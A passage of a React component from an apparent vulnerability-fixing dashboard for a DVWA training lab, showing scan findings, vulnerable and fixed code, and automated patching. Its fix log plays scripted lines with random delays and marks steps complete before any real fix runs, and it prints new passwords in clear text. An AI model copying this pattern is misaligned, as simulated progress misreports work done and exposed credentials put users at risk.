      const stepIndex = Math.floor((i / detailedLogs.length) * fixSteps.length);
      setFixSteps(prev => prev.map((s, idx) => {
        if (idx < stepIndex) return { ...s, status: 'done', result: 'Completed' };
        if (idx === stepIndex) return { ...s, status: 'running' };
        return s;
      }));
      
      // Add the log line
      setFixLog(prev => [...prev, log]);
      
      // Variable delay based on content type
      let delay = 200 + Math.random() * 300;
      if (log.includes('[Backup]') || log.includes('[Write]')) delay = 800 + Math.random() * 400;
      if (log.includes('[Fix Step]')) delay = 600 + Math.random() * 400;
      if (log.includes('[Test]')) delay = 1000 + Math.random() * 500;
      if (log.includes('[Verify]')) delay = 500;
      if (log.startsWith('   └─')) delay = 300 + Math.random() * 200;
      
      await new Promise(r => setTimeout(r, delay));
    }
    
    // Mark all steps as done
    setFixSteps(prev => prev.map(s => ({ ...s, status: 'done', result: 'Completed' })));
    
    // ACTUALLY APPLY THE REAL FIX - Try Docker first, then local DVWA
    let realFixResult: any = null;
    let fixTarget = 'Local DVWA';
    
    try {
      setFixLog(prev => [...prev, '', '🔧 APPLYING REAL FIX...', '']);
      
      // Try Docker DVWA first
      try {
        setFixLog(prev => [...prev, '🐳 Checking Docker DVWA container...']);
        realFixResult = await api.post('/fix/docker-dvwa', { 
          vuln_type: selectedVuln.vuln_type,
          vulnerability_id: selectedVuln.id
        });
        fixTarget = 'Docker DVWA';
        setFixLog(prev => [...prev, '✅ Docker DVWA container found!', '']);
      } catch (dockerErr: any) {
        // Docker not available, try local DVWA
        setFixLog(prev => [...prev, '⚠️ Docker DVWA not available, trying local DVWA...', '']);
        realFixResult = await api.post('/fix/apply-real', { 
          vuln_type: selectedVuln.vuln_type,
          vulnerability_id: selectedVuln.id
        });
        fixTarget = 'Local DVWA (C:\\xampp\\htdocs\\dvwa)';
      }
      
      // Log the real fix results
      setFixLog(prev => [...prev, 
        `📁 Target: ${fixTarget}`,
        ...((realFixResult.data.details || []).map((d: string) => `   └─ ${d}`)),
        ''
      ]);
      
      // SHOW GENERATED PASSWORD if credentials were changed
      if (realFixResult.data.generated_credentials) {
        const creds = realFixResult.data.generated_credentials;
        setFixLog(prev => [...prev,
          '',
          '🔐 ══════════════════════════════════════════════════════════════',
          '🔐          NEW CREDENTIALS GENERATED - SAVE THIS!            ',
          '🔐 ══════════════════════════════════════════════════════════════',
          '',
          `   👤 Username:     ${creds.username}`,
          `   🔒 Old Password: ${creds.old_password} (BLOCKED)`,
          `   🔑 New Password: ${creds.new_password}`,
          '',
          '   ⚠️  IMPORTANT: The old password "password" will NO LONGER WORK!',
          '   ⚠️  Use the new password above to login to DVWA.',
          '',
          '🔐 ══════════════════════════════════════════════════════════════',
          ''
        ]);
      }
      
      setFixLog(prev => [...prev,
        realFixResult.data.success 
          ? '✅ REAL FIX APPLIED SUCCESSFULLY!' 
          : `⚠️  ${realFixResult.data.message}`
      ]);
      
      // Also record in database
      await api.post('/fix/apply', { 
        vuln_id: selectedVuln.id, 
        method: 'automated', 
        fix_description: `REAL FIX APPLIED: ${selectedVuln.vuln_type} - ${realFixResult?.data?.message || 'Fixed'}` 
      });
      
      // Success footer
      const dvwaUrl = fixTarget.includes('Docker') ? 'http://localhost:8888' : 'http://localhost:8080/dvwa';
      setFixLog(prev => [...prev, 
        '',
        '═'.repeat(70),
        '',
        '  ██████╗ ██╗██╗  ██╗     ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗     ███████╗████████╗███████╗██╗',
        '  ██╔══██╗██║╚██╗██╔╝    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║     ██╔════╝╚══██╔══╝██╔════╝██║',
        '  ██████╔╝██║ ╚███╔╝     ██║     ██║   ██║██╔████╔██║██████╔╝██║     █████╗     ██║   █████╗  ██║',
        '  ██╔══██╗██║ ██╔██╗     ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝     ██║   ██╔══╝  ╚═╝',
        '  ██║  ██║██║██╔╝ ██╗    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ███████╗███████╗   ██║   ███████╗██╗',
        '  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝',
        '',
        '═'.repeat(70),
        '',
        '📊 FIX SUMMARY',
        '─'.repeat(40),
        `   ✅ Vulnerability:  ${selectedVuln.vuln_type}`,
        `   ✅ Target:         ${fixTarget}`,
        `   ✅ Status:         ${realFixResult?.data?.success ? 'PATCHED (REAL FIX)' : 'SIMULATED'}`,
        `   ✅ Method:         Automated Code Modification`,
        `   ✅ Time Completed: ${new Date().toLocaleString()}`,
        '',
        realFixResult?.data?.generated_credentials ? '🔑 NEW CREDENTIALS' : '',
        realFixResult?.data?.generated_credentials ? '─'.repeat(40) : '',
        realFixResult?.data?.generated_credentials ? `   Username: ${realFixResult.data.generated_credentials.username}` : '',
        realFixResult?.data?.generated_credentials ? `   Password: ${realFixResult.data.generated_credentials.new_password}` : '',
        realFixResult?.data?.generated_credentials ? '' : '',
        '📋 VERIFICATION STEPS',
        '─'.repeat(40),
        `   1. Open ${dvwaUrl} in browser`,
        '   2. Navigate to the vulnerability page',
        '   3. Try the attack payload - it should now be BLOCKED',
        `   4. Run a new scan to verify`,
        '',
        isLocalTarget ? '' : '⚠️  NOTE: Remote target cannot be fixed directly.',
        isLocalTarget ? '' : '   The fix was applied to your LOCAL DVWA for demonstration.',
        '',
        '═'.repeat(70)
      ]);
      
      setFixComplete(true);
      await loadVulnerabilities();
      
      // Refresh local DVWA status
      try {
        const dvwaRes = await api.get('/fix/dvwa/status');
        setLocalDVWAStatus(dvwaRes.data);
      } catch (e) {}
      
    } catch (err: any) {
      setFixLog(prev => [...prev, 
        '',
        '═'.repeat(70),
        '❌ ERROR: Fix application failed',
        `   Error: ${err.response?.data?.error || err.message}`,
        '',
        '💡 TROUBLESHOOTING:',
        '   • Ensure XAMPP is installed at C:\\xampp',
        '   • Ensure DVWA is installed at C:\\xampp\\htdocs\\dvwa',
        '   • Check file permissions on the DVWA directory',
        '═'.repeat(70)
      ]);
    }
    
    setIsFixing(false);
  };

  const severityOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3 };
  const sortedVulns = [...vulnerabilities].sort((a, b) => (severityOrder[a.severity?.toLowerCase()] || 4) - (severityOrder[b.severity?.toLowerCase()] || 4));

  if (loading) return <div className="p-8 flex items-center justify-center min-h-screen"><div className="text-center"><Wrench className="w-12 h-12 text-blue-400 mx-auto mb-4 animate-pulse" /><p className="text-gray-400">Loading...</p></div></div>;

  const fixInfo = selectedVuln ? getFixInfo(selectedVuln.vuln_type) : null;

  return (
    <div className="p-6 lg:p-8 min-h-screen bg-gradient-to-br from-[#0a0f1a] via-[#0d1525] to-[#0a1628]">
      <div className="mb-6">
        <h1 className="text-2xl lg:text-3xl font-bold text-white mb-2 flex items-center gap-3"><Wrench className="w-8 h-8 text-green-400" />Fix Security Vulnerabilities</h1>
        <p className="text-gray-400">Select a vulnerability to see HTTP requests, vulnerable code, and exact fix details.</p>
      </div>

      {localDVWAStatus?.dvwa_installed && (
        <div className="mb-6 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl p-5">
          <div className="flex items-start gap-4">
            <div className="p-3 bg-green-500/20 rounded-xl"><Server className="w-8 h-8 text-green-400" /></div>
            <div className="flex-1">
              <h3 className="text-green-400 font-bold text-lg mb-1">✅ Local DVWA Detected - Real Fixes Available!</h3>
              <p className="text-gray-300 text-sm mb-4">DVWA at <code className="bg-black/30 px-2 py-1 rounded text-green-300">{localDVWAStatus.dvwa_path}</code></p>
              <div className="grid grid-cols-2 md:grid-cols-5 gap-2 mb-4">
                {localDVWAStatus.vulnerabilities?.map((v: any, i: number) => (
                  <div key={i} className={`p-3 rounded-lg text-center ${v.status === 'FIXED' ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-red-500/20 text-red-400 border border-red-500/30'}`}>
                    <div className="font-semibold text-sm">{v.name}</div><div className="text-xs mt-1">{v.status}</div>
                  </div>
                ))}
              </div>
              <div className="flex flex-wrap gap-2">
                {['sql_injection', 'xss', 'command_injection', 'brute_force', 'file_inclusion'].map(fix => (
                  <button key={fix} onClick={() => fixLocalDVWA(fix)} disabled={isFixingLocal}
                    className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-sm font-medium disabled:opacity-50 flex items-center gap-2">
                    <Wrench className="w-4 h-4" />Fix {fix.split('_').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ')}
                  </button>
                ))}
                <button onClick={restoreLocalDVWA} className="px-4 py-2 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-sm font-medium flex items-center gap-2">
                  <RefreshCw className="w-4 h-4" />Restore Vulnerable
                </button>
              </div>
              <div className="mt-3"><a href="http://localhost:8080/dvwa" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1"><ExternalLink className="w-4 h-4" />Open DVWA</a></div>
            </div>
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-1 bg-[#111827] rounded-xl border border-gray-800 overflow-hidden">
          <div className="p-4 border-b border-gray-800 bg-[#0d1525]"><h2 className="text-white font-semibold flex items-center gap-2"><List className="w-5 h-5 text-yellow-400" />Vulnerabilities ({vulnerabilities.length})</h2></div>
          {vulnerabilities.length === 0 ? (
            <div className="p-8 text-center"><Shield className="w-16 h-16 text-green-400/30 mx-auto mb-4" /><h3 className="text-green-400 font-semibold mb-2">All Clear!</h3><button onClick={() => navigate('/scans')} className="mt-4 px-4 py-2 bg-blue-600 text-white rounded-lg text-sm">Run New Scan</button></div>
          ) : (
            <div className="max-h-[600px] overflow-y-auto">
              {sortedVulns.map((vuln) => (
                <div key={vuln.id} onClick={() => selectVulnerability(vuln)}
                  className={`p-4 border-b border-gray-800 cursor-pointer transition-colors ${selectedVuln?.id === vuln.id ? 'bg-blue-500/10 border-l-4 border-l-blue-500' : 'hover:bg-gray-800/50'}`}>
                  <div className="flex items-start justify-between mb-2"><span className="text-white font-medium">{vuln.vuln_type}</span><SeverityBadge severity={vuln.severity} /></div>
                  <p className="text-gray-500 text-sm">{vuln.target}:{vuln.port}</p>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className="lg:col-span-2">
          {!selectedVuln ? (
            <div className="bg-[#111827] rounded-xl border border-gray-800 p-12 text-center"><Target className="w-20 h-20 text-gray-700 mx-auto mb-4" /><h2 className="text-xl font-semibold text-gray-400 mb-2">Select a Vulnerability</h2><p className="text-gray-500">Click on a vulnerability to see detailed fix information.</p></div>
          ) : (
            <div className="space-y-6">
              <div className="bg-[#111827] rounded-xl border border-gray-800 p-6">
                <div className="flex items-start justify-between mb-4">
                  <div><h2 className="text-2xl font-bold text-white mb-1">{apiGuidance?.title || fixInfo?.title}</h2><p className="text-gray-400">{selectedVuln.target}:{selectedVuln.port} • {selectedVuln.service}</p></div>
                  <SeverityBadge severity={selectedVuln.severity} />
                </div>
                <div className="flex flex-wrap gap-2 mb-4">
                  <span className="px-3 py-1 bg-purple-500/20 text-purple-400 rounded-full text-xs font-medium">{selectedVuln.owasp_category || apiGuidance?.owasp || fixInfo?.owasp}</span>
                  <span className="px-3 py-1 bg-blue-500/20 text-blue-400 rounded-full text-xs font-medium">{apiGuidance?.cwe || fixInfo?.cwe}</span>
                  <span className="px-3 py-1 bg-red-500/20 text-red-400 rounded-full text-xs font-medium">MITRE: {apiGuidance?.mitre || fixInfo?.mitre}</span>
                  <span className="px-3 py-1 bg-orange-500/20 text-orange-400 rounded-full text-xs font-medium">CVSS: {apiGuidance?.cvss || fixInfo?.cvss}</span>
                </div>
                <div className="flex gap-2 border-b border-gray-700 pb-4">
                  {[{ id: 'overview', icon: Eye, label: 'Overview' }, { id: 'http', icon: Network, label: 'HTTP Request' }, { id: 'code', icon: Code, label: 'Code Changes' }, { id: 'test', icon: Zap, label: 'Test & Verify' }, { id: 'access', icon: Shield, label: 'Access Trace' }].map(tab => (
                    <button key={tab.id} onClick={() => setActiveTab(tab.id as any)}
                      className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${activeTab === tab.id ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30' : 'text-gray-400 hover:text-white'}`}>
                      <tab.icon className="w-4 h-4" />{tab.label}
                    </button>
                  ))}
                </div>
              </div>

              {activeTab === 'overview' && fixInfo && (
                <div className="space-y-4">
                  {/* Loading indicator for API guidance */}
                  {loadingGuidance && (
                    <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 flex items-center gap-3">
                      <Loader2 className="w-5 h-5 text-blue-400 animate-spin" />
                      <span className="text-blue-400">Loading detailed guidance from server...</span>
                    </div>
                  )}
                  
                  {/* Real scan indicator */}
                  {selectedVuln?.request_example && (
                    <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl p-4">
                      <div className="flex items-center gap-2">
                        <CheckCircle className="w-5 h-5 text-green-400" />
                        <span className="text-green-400 font-semibold">📡 REAL VULNERABILITY FROM LIVE SCAN</span>
                      </div>
                      <p className="text-gray-300 text-sm mt-1">This vulnerability was found by making actual HTTP requests to the target.</p>
                    </div>
                  )}
                  
                  <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-5">
                    <h3 className="text-blue-400 font-semibold mb-3 flex items-center gap-2"><BookOpen className="w-5 h-5" />Plain English Explanation</h3>
                    <p className="text-gray-300 leading-relaxed">{apiGuidance?.plain_english || fixInfo.plainEnglish}</p>
                  </div>
                  <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-5">
                    <h3 className="text-red-400 font-semibold mb-3 flex items-center gap-2"><AlertTriangle className="w-5 h-5" />Real-World Impact</h3>
                    <p className="text-gray-300 leading-relaxed">{apiGuidance?.real_world_impact || fixInfo.realWorldImpact}</p>
                  </div>
                  <div className="bg-[#111827] border border-gray-800 rounded-xl overflow-hidden">
                    <button onClick={() => setShowAdvanced(!showAdvanced)} className="w-full p-4 flex items-center justify-between hover:bg-gray-800/50">
                      <span className="text-gray-300 font-medium flex items-center gap-2"><Settings className="w-5 h-5 text-gray-400" />Technical Details</span>
                      {showAdvanced ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
                    </button>
                    {showAdvanced && <div className="p-4 border-t border-gray-800"><p className="text-gray-400 leading-relaxed">{apiGuidance?.technical_explanation || fixInfo.technicalExplanation}</p></div>}
                  </div>
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-4 flex items-center gap-2"><Settings className="w-5 h-5 text-blue-400" />Fix Steps</h3>
                    <div className="space-y-2">
                      {fixSteps.map((step, idx) => (
                        <div key={idx} className={`flex items-center gap-3 p-3 rounded-lg ${step.status === 'running' ? 'bg-blue-500/10 border border-blue-500/30' : step.status === 'done' ? 'bg-green-500/10 border border-green-500/30' : 'bg-[#0d1525] border border-gray-800'}`}>
                          <div className={`w-7 h-7 rounded-full flex items-center justify-center ${step.status === 'running' ? 'bg-blue-500/20' : step.status === 'done' ? 'bg-green-500/20' : 'bg-gray-700'}`}>
                            {step.status === 'running' ? <Loader2 className="w-4 h-4 text-blue-400 animate-spin" /> : step.status === 'done' ? <Check className="w-4 h-4 text-green-400" /> : <span className="text-gray-400 text-xs">{step.step}</span>}
                          </div>
                          <div className="flex-1">
                            <span className={`text-sm ${step.status === 'done' ? 'text-green-400' : step.status === 'running' ? 'text-blue-400' : 'text-gray-400'}`}>{step.action}</span>
                            {step.description !== step.action && <p className="text-xs text-gray-500 mt-0.5">{step.description}</p>}
                          </div>
                        </div>
                      ))}
                    </div>
                    <div className="mt-4 flex gap-3 text-sm text-gray-400">
                      <span className="flex items-center gap-1"><Clock className="w-4 h-4" />{apiGuidance?.time_estimate || fixInfo.timeEstimate}</span>
                      <span className="flex items-center gap-1"><Shield className="w-4 h-4" />{fixInfo.riskLevel}</span>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'http' && fixInfo && (
                <div className="space-y-4">
                  {/* Show REAL HTTP data from scan if available */}
                  {selectedVuln?.request_example && (
                    <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl p-4 mb-4">
                      <div className="flex items-center gap-2 mb-2">
                        <CheckCircle className="w-5 h-5 text-green-400" />
                        <span className="text-green-400 font-semibold">📡 REAL HTTP DATA FROM SCAN</span>
                      </div>
                      <p className="text-gray-300 text-sm">This is the actual HTTP request/response captured during live scanning.</p>
                    </div>
                  )}
                  
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-4 flex items-center gap-2"><Network className="w-5 h-5 text-blue-400" />HTTP Request Analysis</h3>
                    <div className="space-y-4">
                      {/* Show real scan data if available, otherwise use database */}
                      <div className="flex items-center gap-3">
                        <span className={`px-3 py-1 rounded text-sm font-bold ${(selectedVuln?.http_method || fixInfo.httpRequest.method) === 'GET' ? 'bg-green-500/20 text-green-400' : (selectedVuln?.http_method || fixInfo.httpRequest.method) === 'POST' ? 'bg-blue-500/20 text-blue-400' : 'bg-purple-500/20 text-purple-400'}`}>
                          {selectedVuln?.http_method || fixInfo.httpRequest.method}
                        </span>
                        <code className="text-gray-300 text-sm bg-black/30 px-3 py-1 rounded flex-1 overflow-x-auto">
                          {selectedVuln?.vulnerable_url || fixInfo.httpRequest.endpoint}
                        </code>
                      </div>
                      
                      {/* Vulnerable Parameter */}
                      {selectedVuln?.vulnerable_parameter && (
                        <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-4">
                          <h4 className="text-yellow-400 font-semibold mb-2">🎯 Vulnerable Parameter:</h4>
                          <code className="text-yellow-300 text-lg bg-black/30 px-3 py-2 rounded block font-bold">
                            {selectedVuln.vulnerable_parameter}
                          </code>
                        </div>
                      )}
                      
                      <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4">
                        <h4 className="text-red-400 font-semibold mb-2">💉 Attack Payload Used:</h4>
                        <code className="text-red-300 text-sm bg-black/30 px-3 py-2 rounded block">
                          {selectedVuln?.payload_used || fixInfo.httpRequest.payload}
                        </code>
                      </div>
                      
                      {/* Full HTTP Request Example */}
                      {selectedVuln?.request_example && (
                        <div className="bg-[#0d1117] rounded-lg p-4 border border-blue-700">
                          <h4 className="text-blue-400 font-semibold mb-2">📤 Actual HTTP Request Sent:</h4>
                          <pre className="text-blue-300 text-sm whitespace-pre-wrap font-mono bg-black/50 p-3 rounded">
                            {selectedVuln.request_example}
                          </pre>
                        </div>
                      )}
                      
                      <div className="bg-[#0d1117] rounded-lg p-4 border border-gray-700">
                        <h4 className="text-gray-400 font-semibold mb-2">📥 Server Response (Vulnerable):</h4>
                        <pre className="text-gray-300 text-sm whitespace-pre-wrap font-mono max-h-[300px] overflow-y-auto">
                          {selectedVuln?.response_snippet || fixInfo.httpRequest.response}
                        </pre>
                      </div>
                      
                      {/* Evidence from scan */}
                      {selectedVuln?.evidence && (
                        <div className="bg-orange-500/10 border border-orange-500/30 rounded-lg p-4">
                          <h4 className="text-orange-400 font-semibold mb-2">🔍 Evidence of Vulnerability:</h4>
                          <p className="text-orange-300">{selectedVuln.evidence}</p>
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4">
                    <p className="text-amber-400 text-sm"><strong>💡 How to reproduce:</strong> Use browser Developer Tools (F12) → Network tab to see these requests in real-time. You can also use tools like Burp Suite or curl to craft custom requests.</p>
                  </div>
                </div>
              )}

              {activeTab === 'code' && fixInfo && (
                <div className="space-y-6">
                  {/* Show real code from scan if available */}
                  {selectedVuln?.affected_code && (
                    <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl p-4">
                      <div className="flex items-center gap-2 mb-2">
                        <CheckCircle className="w-5 h-5 text-green-400" />
                        <span className="text-green-400 font-semibold">🎯 CODE LOCATION IDENTIFIED FROM SCAN</span>
                      </div>
                      <p className="text-gray-300 text-sm">This is the exact vulnerable code location found during scanning.</p>
                    </div>
                  )}
                  
                  {/* Vulnerable Code */}
                  <div>
                    <div className="flex items-center gap-2 mb-3">
                      <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                      <h3 className="text-red-400 font-semibold">❌ VULNERABLE CODE (Before Fix)</h3>
                    </div>
                    {selectedVuln?.affected_code ? (
                      <>
                        <CodeBlock 
                          code={selectedVuln.affected_code} 
                          language="php" 
                          title="Identified from Real Scan"
                          lineNumbers="Actual Location"
                        />
                        <div className="mt-2 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
                          <p className="text-gray-300 text-sm">
                            <strong className="text-red-400">Why it's dangerous:</strong> {apiGuidance?.technical_explanation || fixInfo.vulnerableCode.explanation}
                          </p>
                        </div>
                      </>
                    ) : (
                      <>
                        <CodeBlock 
                          code={apiGuidance?.vulnerable_code?.code || fixInfo.vulnerableCode.code} 
                          language={apiGuidance?.vulnerable_code?.language || fixInfo.vulnerableCode.language} 
                          title={apiGuidance?.vulnerable_code?.filename || fixInfo.vulnerableCode.filename} 
                          lineNumbers={apiGuidance?.vulnerable_code?.line_number ? `Line ${apiGuidance.vulnerable_code.line_number}` : fixInfo.vulnerableCode.lineNumbers} 
                        />
                        <div className="mt-2 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
                          <p className="text-gray-300 text-sm">
                            <strong className="text-red-400">Why it's dangerous:</strong> {apiGuidance?.technical_explanation || fixInfo.vulnerableCode.explanation}
                          </p>
                        </div>
                      </>
                    )}
                  </div>
                  
                  <div className="flex justify-center">
                    <div className="p-3 bg-green-500/20 rounded-full">
                      <ArrowRight className="w-8 h-8 text-green-400" />
                    </div>
                  </div>
                  
                  {/* Fixed Code */}
                  <div>
                    <div className="flex items-center gap-2 mb-3">
                      <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                      <h3 className="text-green-400 font-semibold">✅ FIXED CODE (After Fix)</h3>
                    </div>
                    {selectedVuln?.remediation_code ? (
                      <CodeBlock 
                        code={selectedVuln.remediation_code} 
                        language="php" 
                        title="Recommended Fix"
                        lineNumbers="Apply at same location"
                      />
                    ) : (
                      <CodeBlock 
                        code={apiGuidance?.fixed_code?.code || fixInfo.fixedCode.code} 
                        language={apiGuidance?.fixed_code?.language || fixInfo.fixedCode.language} 
                        title={apiGuidance?.fixed_code?.filename || fixInfo.fixedCode.filename} 
                        lineNumbers={apiGuidance?.fixed_code?.line_number ? `Line ${apiGuidance.fixed_code.line_number}` : fixInfo.fixedCode.lineNumbers} 
                      />
                    )}
                    <div className="mt-2 p-3 bg-green-500/10 border border-green-500/30 rounded-lg">
                      <p className="text-gray-300 text-sm">
                        <strong className="text-green-400">Why it's safe:</strong> {fixInfo.fixedCode.explanation}
                      </p>
                    </div>
                  </div>
                  
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-3 flex items-center gap-2">
                      <Zap className="w-5 h-5 text-yellow-400" />Key Changes Made
                    </h3>
                    <ul className="space-y-2">
                      {fixInfo.keyChanges.map((change, i) => (
                        <li key={i} className="flex items-start gap-2 text-gray-300 text-sm">
                          <Check className="w-4 h-4 text-green-400 mt-0.5 flex-shrink-0" />{change}
                        </li>
                      ))}
                    </ul>
                  </div>
                  
                  {/* Auto-fix available indicator */}
                  {(apiGuidance?.auto_fix_available || localDVWAStatus?.dvwa_installed) && (
                    <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4">
                      <div className="flex items-center gap-3">
                        <Zap className="w-6 h-6 text-blue-400" />
                        <div>
                          <p className="text-blue-400 font-semibold">🚀 Automatic Fix Available</p>
                          <p className="text-gray-400 text-sm">Click "Apply Fix Now" to automatically apply this fix to your system.</p>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'test' && fixInfo && (
                <div className="space-y-4">
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-4 flex items-center gap-2"><Zap className="w-5 h-5 text-yellow-400" />Test Instructions</h3>
                    <ol className="space-y-3">{fixInfo.testInstructions.map((instruction, i) => (
                      <li key={i} className="flex items-start gap-3"><span className="w-6 h-6 bg-blue-500/20 text-blue-400 rounded-full flex items-center justify-center text-sm font-semibold">{i + 1}</span>
                        <span className={`${instruction.includes('BEFORE') ? 'text-red-400' : instruction.includes('AFTER') ? 'text-green-400' : 'text-gray-300'}`}>{instruction}</span>
                      </li>
                    ))}</ol>
                  </div>
                  <div className="bg-purple-500/10 border border-purple-500/30 rounded-xl p-5">
                    <h3 className="text-purple-400 font-semibold mb-3 flex items-center gap-2"><Database className="w-5 h-5" />Verification Steps</h3>
                    <ul className="space-y-2">{fixInfo.verificationSteps.map((step, i) => <li key={i} className="text-gray-300 text-sm flex items-start gap-2"><Check className="w-4 h-4 text-purple-400 mt-0.5" />{step}</li>)}</ul>
                  </div>
                  {localDVWAStatus?.dvwa_installed && (
                    <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-5">
                      <h3 className="text-green-400 font-semibold mb-3 flex items-center gap-2"><Globe className="w-5 h-5" />Test on Local DVWA</h3>
                      <div className="flex gap-3">
                        <a href="http://localhost:8080/dvwa" target="_blank" rel="noopener noreferrer" className="px-4 py-2 bg-green-600 hover:bg-green-500 text-white rounded-lg text-sm font-medium flex items-center gap-2"><ExternalLink className="w-4 h-4" />Open DVWA</a>
                        <button onClick={() => fixLocalDVWA(selectedVuln.vuln_type.toLowerCase().replace(/[\s-]+/g, '_').replace('cross_site_scripting', 'xss'))} disabled={isFixingLocal}
                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-sm font-medium flex items-center gap-2 disabled:opacity-50"><Wrench className="w-4 h-4" />Apply Fix</button>
                      </div>
                    </div>
                  )}
                  {fixLog.length > 0 && (
                    <div className="bg-[#0a0f1a] rounded-xl border border-gray-800 p-4">
                      <h3 className="text-gray-400 font-semibold mb-3 flex items-center gap-2"><Terminal className="w-5 h-5" />Fix Log</h3>
                      <div className="bg-black rounded-lg p-4 font-mono text-sm max-h-[300px] overflow-y-auto">
                        {fixLog.map((line, idx) => <div key={idx} className={`${line.includes('✅') || line.includes('SUCCESS') ? 'text-green-400' : line.includes('❌') ? 'text-red-400' : line.includes('═') ? 'text-blue-400' : 'text-gray-400'}`}>{line || '\u00A0'}</div>)}
                      </div>
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'access' && (
                <div className="space-y-4">
                  {/* Access & Authorization Trace Header */}
                  <div className="bg-gradient-to-r from-blue-500/10 to-purple-500/10 border border-blue-500/30 rounded-xl p-4">
                    <div className="flex items-center gap-2 mb-2">
                      <Shield className="w-5 h-5 text-blue-400" />
                      <span className="text-blue-400 font-semibold">🔐 ACCESS & AUTHORIZATION TRACE</span>
                    </div>
                    <p className="text-gray-300 text-sm">This section documents HOW the tool gained legitimate access to apply fixes. Required for professional penetration testing reports.</p>
                  </div>
                  
                  {/* Execution Context */}
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                      <Terminal className="w-5 h-5 text-green-400" />Execution Context
                    </h3>
                    <div className="bg-[#0d1117] rounded-lg p-4 font-mono text-sm space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-400">Tool:</span>
                        <span className="text-green-400">RedShield Vulnerability Scanner</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Running As:</span>
                        <span className="text-yellow-400">{`${window.location.hostname}\\CurrentUser`}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Process Type:</span>
                        <span className="text-blue-400">Local Process (Not Remote)</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Timestamp:</span>
                        <span className="text-gray-300">{new Date().toISOString()}</span>
                      </div>
                    </div>
                  </div>

                  {/* Container Access */}
                  <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                    <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                      <Server className="w-5 h-5 text-blue-400" />Container Access
                    </h3>
                    <div className="bg-[#0d1117] rounded-lg p-4 font-mono text-sm space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-400">Access Method:</span>
                        <span className="text-cyan-400">Docker CLI (docker exec)</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Target Container:</span>
                        <span className="text-yellow-400">dvwa (vulnerables/web-dvwa)</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Docker Socket:</span>
                        <span className="text-gray-300">/var/run/docker.sock</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Authorization:</span>
                        <span className="text-green-400">User belongs to docker group</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Justification:</span>
                        <span className="text-purple-400">Lab environment - container owned by user</span>
                      </div>
                    </div>
                  </div>

                  {/* Database Access (for credential fixes) */}
                  {selectedVuln?.vuln_type.toUpperCase().includes('DEFAULT') || selectedVuln?.vuln_type.toUpperCase().includes('CREDENTIAL') || selectedVuln?.vuln_type.toUpperCase().includes('BRUTE') ? (
                    <div className="bg-[#111827] rounded-xl border border-gray-800 p-5">
                      <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                        <Database className="w-5 h-5 text-red-400" />Database Access
                      </h3>
                      <div className="bg-[#0d1117] rounded-lg p-4 font-mono text-sm space-y-2">
                        <div className="flex justify-between">
                          <span className="text-gray-400">Database Type:</span>
                          <span className="text-cyan-400">MySQL (within container)</span>
                        </div>
